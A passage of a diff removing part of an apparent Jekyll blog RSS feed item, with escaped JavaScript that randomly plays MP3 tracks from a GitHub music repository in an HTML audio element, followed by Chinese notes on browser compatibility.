-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%88%98%E6%AC%A2%20-%20%E6%88%91%E6%AC%B2%E6%88%90%E4%BB%99.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E6%AF%9B%E9%98%BF%E6%95%8F%20-%20%E7%9B%B8%E6%80%9D.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E9%9D%92%E9%B8%9F%E9%A3%9E%E9%B1%BC-%E6%AD%A4%E7%94%9F%E4%B8%8D%E6%8D%A2.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%AD%99%E6%A5%A0%E9%9F%A9%E7%BA%A2%E7%BE%8E%E4%B8%BD%E7%9A%84%E7%A5%9E%E8%AF%9D.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%90%B4%E5%A5%87%E9%9A%86%20-%20%E8%BD%AC%E5%BC%AF.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%90%B4%E9%9B%A8%E9%9C%8F%20-%20%E7%94%9F%E7%94%9F%E4%B8%96%E4%B8%96%E7%88%B1.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E6%9C%88%E5%85%89.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%BC%A0%E5%85%8B%E5%B8%86%20-%20%E7%BB%9D%E4%B8%96.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%AD%99%E6%A5%A0%E9%9F%A9%E7%BA%A2%E7%BE%8E%E4%B8%BD%E7%9A%84%E7%A5%9E%E8%AF%9D.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;currentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/*document.write(&quot;&amp;lt;html&amp;gt;&amp;lt;br&amp;gt;&quot;+&#39;&amp;lt;audio src=&#39; + &#39;&quot;&#39; + list[a] + &#39;&quot;&#39; + &#39; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot;&#39; + &#39;&amp;gt;&#39;+&#39;&amp;lt;/audio&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/html&amp;gt;&#39;);*/&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;myaudio&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;currentFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;play&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onended&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;currentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;currentFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;oAudio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;play&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;3&amp;gt;&lt;em&gt;Notice&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1&amp;gt;&amp;gt;经过试验发现:上面的javascript中只能用&amp;lt;audio&amp;gt;标签,不能用&amp;lt;embed&amp;gt;标签
- 2&amp;gt;&amp;gt;document.write方法似乎只能用一次，所以最后不用document.write的代码(上面/*...*/中的代码)
- 3&amp;gt;&amp;gt;上面的javascript中可firefox,chrome都实现播放音乐列表功能,且可以实现随机播放,原来的&amp;lt;embed&amp;gt;标签加m3u文件的代码只能firefox下播音乐列表，且不能随机播放
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Sat, 09 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/jekyll/2016/04/09/github-jekyll-blog/</link>
-        <guid isPermaLink="true">/jekyll/2016/04/09/github-jekyll-blog/</guid>
-        
-        <category>html</category>
-        
-        
-        <category>jekyll</category>
         
       </item>
     
